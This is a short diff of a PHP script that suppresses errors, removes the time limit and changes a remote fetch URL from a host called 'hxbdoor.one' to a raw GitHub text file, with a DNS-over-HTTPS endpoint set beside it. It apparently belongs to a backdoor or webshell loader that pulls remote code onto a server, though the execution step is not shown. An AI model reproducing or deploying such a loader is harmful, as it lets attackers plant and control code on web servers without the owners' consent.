@@ -3,7 +3,7 @@
 error_reporting(0);
 set_time_limit(0);
 
-$url = "https://hxbdoor.one/raw/Sq7NeO2n";
+$url = "https://raw.githubusercontent.com/apekcan168/raw/refs/heads/main/apc.txt";
 
 $dns = "https://cloudflare-dns.com/dns-query";
 
